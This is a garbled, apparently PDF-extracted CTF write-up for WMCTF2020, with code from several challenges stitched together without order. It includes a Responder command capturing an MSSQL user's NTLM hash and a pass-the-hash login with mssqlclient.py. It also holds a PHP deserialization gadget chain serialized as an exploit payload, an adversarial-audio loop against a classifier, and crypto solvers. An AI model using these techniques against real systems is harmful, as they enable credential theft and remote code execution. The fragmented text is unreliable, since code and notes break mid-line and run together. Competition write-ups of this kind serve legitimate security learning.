if __name__ == "__main__":
    main()
>> try to request url...
Warning:  curl_setopt(): Curl option contains invalid characters (\0) 
in C:\phpstudy_pro\WWW\index.php on line 4
>> nothing.
Responder.py -I eth0 --lm
sqluser::172_17_0_5:003BD64A68125E39500407807B3DAC62159D8306921AE676:003BD64A6
8125E39500407807B3DAC62159D8306921AE676:1122334455667788
python mssqlclient.py 172_17_0_5/PI:EMAIL  -hashes 
9e8b5692b2507c3b917cf60a63b12bc3:9e8b5692b2507c3b917cf60a63b12bc3 -windows-
auth
events['disconnect'] = 'F3::AGENT->';
        $this->events['disconnect'] = 'F3::config';
    }
    }
}
namespace CLI{
class WS {
    const
        //! UUID magic string
        Magic='258EAFA5-E914-47DA-95CA-C5AB0DC85B11',
        //! Max packet size
        Packet=65536;
    //@{ Mask bits for first byte of header
    const
        Text=0x01,
        Binary=0x02,
        Close=0x08,
        Ping=0x09,
        Pong=0x0a,
        OpCode=0x0f,
        Finale=0x80;
    //@}
    //@{ Mask bits for second byte of header
    const
        Length=0x7f;
    //@}
    protected
        $addr,
        $ctx,
        $wait,
        $sockets,
        $protocol,
        $agents=[];
    public $events=[];
    function __construct() {
        $this->events['disconnect']='var_dump';
    }
    function setaddr($a){
        $this->addr = $a;
    }
}
class Agent {
    public $a;
    public $b;
    protected
        $server,
        $id=1,
        $socket='1',
        $flag='1',
        $verb='1',
        $uri='1',
        $headers='1';
    public function  __construct($ws){
        $this->a = '/tmp/sess_smi1esmi1e';
        $this->b = 456;
        $this->server = $ws;
web_checkin
http://web_checkin.wmctf.wetolink.com/?content=/flag
Misc
Music_game
XMAN_Happy_birthday
flag
Performance_artist
EMNISTCRC644
defcon final ai
    }
}
$WS = new WS();
$Auth = new \Auth();
$Agent = new Agent($Auth);
$WS->setaddr($Agent);
echo urlencode(serialize($WS));
}
from PIL import Image
import os
im = Image.open('attachment.png')
charset1 = '0123456789'
charset2 = 'ABCDEF'
dataset1 = 'training'
dataset2 = 'emnist-byclass'
def check(row,col, candidate):
    tmp = im.crop((28*col,28*row,28*col+28,28*row+28))
    if candidate in charset1:
        for fname in os.listdir(f'pngs/{dataset1}/{candidate}'):
            t = Image.open(f'pngs/{dataset1}/{candidate}/{fname}')
brainfuck to textflag
sign-in
welcome to WMCTF2020,here is your flag: https://t.me/WMCTF
            if t.tobytes() == tmp.tobytes():
                return True
        return False
    elif candidate in charset2:
        for fname in os.listdir(f'pngs/{dataset2}/{candidate}'):
            t = Image.open(f'pngs/{dataset2}/{candidate}/{fname}')
            if t.tobytes() == tmp.tobytes():
                return True
        return False
guess = '''504B0304140000000800DB93C55086A3
9007D8000000DF01000008000000666C
61672E74787475504B0E823010DD9370
8771DDCCB0270D5BBD0371815A9148AC
6951C2ED9D271F89C62E2693D7F76BB7
DE9FC80D2E6E68E782A326D2E01F81CE
6D55E76972E9BA7BCCB3ACEF7B89F7B6
E90EA16A6EE2439D45179ECDD1C5CCFB
6B9AE489C1218C92B898779D765FCCBB
58CC920B6662C5F91749931132258F32
BBA7C288C5AE1031331A6608409DAC41
9F7724143412907814AB7A9221D6B8DE
D0D25AEC8A634929025C46A33FE5A1D3
1679100323B1ABEE4A7A0708413A19E1
7718165F5D3E73D577798E36D5144B66
315AAE315078F5E51A292469F402504B
01021F00140000000800DB93C55086A3
9007D8000000DF010000080024000000
000000002000000000000000666C6167
2E7478740A0020000000000001001800
4A0A9A64243BD601F9D8AB392436D601
2D00CA13223BD601504B050600000000
010001005A000000FE00000000000000'''
for row, line in enumerate(guess.splitlines()):
    for col, val in enumerate(line):
        if not check(row, col, val):
            print(row, col, val)
row = 20
col = 27
tmp = im.crop((28*col,28*row,28*col+28,28*row+28))
tmp.show()
print(check(row,col,'B'))
Dalabengba
Part1
Part2
part2githubhttps://github.com/MidoriYakumo/Fd
Sig Aztec code 
https://manateeworks.com/free-barcode-scanner
Part3
‘5465162526f5f653f5562704f5570395’ ""Y0u_@re_5o_bRaVE
s3cr3t.crypto0x9,0x208
0x9,0x200,1
flag
Music_game_2
librosamfcc_to_audiomfccwav
np.mean(np.abs(mfcc1-mfcc2))2MFCCwav
L1-norm
MFCC
+200wav
0.9
np.mean(np.abs(mfcc1-mfcc2))4
pythonwav
for i in range(20):
    for j in range(30):
        print('='*50)
        print(i, j)
        y, sr = librosa.load(path,sr=None)
        mfccs = get_wav_mfcc(path)
        mfccs = mfccs.T
        mfccs[i][j] += 200
        wav = librosa.feature.inverse.mfcc_to_audio(mfccs, sr=sr)
        fname = f'test_{i}_{j}.wav'
        sf.write(fname, wav, sr)
        mfcc1 = get_wav_mfcc(fname)
        print(np.mean(np.abs(mfcc1-mfcc2)))
        ret=model.predict(mfcc1.reshape(1,30,20))
        if ret[0][3] > max_score:
            max_score = ret[0][3]
            print(ret)
            print(ret.max(),ret.argmax())
for delta in range(200,400):
    print('='*50)
    y, sr = librosa.load(path,sr=None)
    mfccs = get_wav_mfcc(path)
    mfccs = mfccs.T
    # print(mfccs[15][11])
    # print(mfccs[4][20])
    # print(mfccs[2][16])
    mfccs[1][11] += delta
    # mfccs[4][20] += 200
    # mfccs[2][16] += 100
    # print(mfccs[1])
    wav = librosa.feature.inverse.mfcc_to_audio(mfccs, sr=sr)
    fname = f'test.wav'
    sf.write(fname, wav, sr)
    mfcc1 = get_wav_mfcc(fname)
    # print((mfcc1-mfcc2).argmax())
    diff = np.mean(np.abs(mfcc1-mfcc2))
    print(diff)
    ret=model.predict(mfcc1.reshape(1,30,20))
FeedBack
We need your FeedBack! https://forms.gle/SmTytGGhvYxDtuoA7
Crypto
piece_of_cake
    print(ret)
    print(ret.max(),ret.argmax())    
    if ret[0][3] > 0.9 and diff <4:
        break
        max_score = ret[0][3]
import requests
url = 'https://game2.wmctf.wetolink.com:4432/'
session = '.eJwFwdsSQkAAANBfafa1h8S2mWZ6EMYQ0pDwti7r0pa2dpWMf--cCdzxE-
wmsMjBDgS6mUsVw9ZPxbZ2itpiKA2mLtWmh8mWszhDcE2FnkTcd4qx8kXNvZBwqLcKe9SXUnThSj7C
XDax1uv1i7RWqQRi7FPS2bFAInvAE7Y2MjqYUUfpV7oVLnUxWn0PblOl5NPZahMiONxrZzD9SyZfte
RsCF4a7XXkhHpnFkNJeu_BPP8BGEA_PA.XybWJA.JTT_ZES9_dEA46EaKQ9lL2wgemE'
session = requests.post(url,files=
{'upfile':open('down.wav','rb').read()},cookies=
{'session':session}).headers['Set-Cookie'].split(';')[0][8:]
session = requests.post(url,files=
{'upfile':open('down.wav','rb').read()},cookies=
{'session':session}).headers['Set-Cookie'].split(';')[0][8:]
print(session)
babySum
sumsubset-sumsum
https://soreatu.com/posts/crypto-research-subset-su
m-problem/
q = 
192359116448169144239732559279167873674991055528723274633585550105988805882314
588820655472460542318699972690928754637295378701423245337531315365873278580242
690480684018217070094366564824180605097399643802487403317451651763211695567182
196794638278905490507370178938754153003096171453989691642021501195619445626100
789234651345443008897426151861259659735437665633698289583784192221631081801280
6039994663130018389148915877140241977970197925777401420049248182571504461
h = 
205862450202644247416381466889451705753584436982629845673419003542312234098678
496245050989108734812051677022721812470657380148023723451057574466208711105989
751130012118500476671039723516645310783572817552226133138815812847888851891317
119112290035673185342790228472294281341625029243927396384948462350845827693165
837490995325509946351616404970719915734846507572199409518758474421626356643755
240183759107296301030055873601924541277345803987979508628631863663648575
c = 
174326836776806877877770710542637269194160466464062665478768414192232699159805
709026962742906283133814764497402755448631915159420482945832506873726675136923
021901190702445828886191650614068062336166329481012181454991341541184200821021
177593874807666551819798004287508855767634327219980976724411637224437895321802
657408414325075346347925480141051333954906670797338529450025907981864915752525
2102771651790606426529094873286329899722334520351222862771146760669718142
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, q])
m = matrix([v1,v2]);
f, g = m.LLL()[0]
a = f*c % p % g
m = a * inverse_mod(f, g) % g
print(m)
import re
import random
import multiprocessing as mp
from functools import partial
def check(sol, A, s):
    """Check whether *sol* is a solution to the subset-sum problem.
    """
    return sum(x*a for x, a in zip(sol, A)) == s
def solve(A, n, k, s, ID=None, BS=22):